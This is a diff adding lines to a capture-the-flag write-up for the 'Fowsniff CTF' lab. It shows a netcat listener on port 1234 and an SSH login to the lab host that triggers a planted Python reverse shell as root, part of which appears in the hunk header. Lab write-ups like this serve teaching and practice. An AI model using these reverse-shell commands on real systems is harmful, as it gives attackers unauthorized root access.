@@ -840,6 +840,18 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ==No answer needed==
 
 We can then exit our SSH session and set up a listener on our local machine:
+```
+┌──(kali㉿kali)-[~/ET/THM/Fowsniff CTF]
+└─$ nc -nvlp 1234
+```
+
+When we open a separate terminal and log in via SSH we should now get a reverse shell as the _root_ user within our listener - from here we can simply change to the _root_ directory and grab the flag.
+
+```
+┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
+└─# ssh baksteen@10.82.154.253
+baksteen@10.82.154.253's password: 
+```
 <div>
 <br>
 <br>
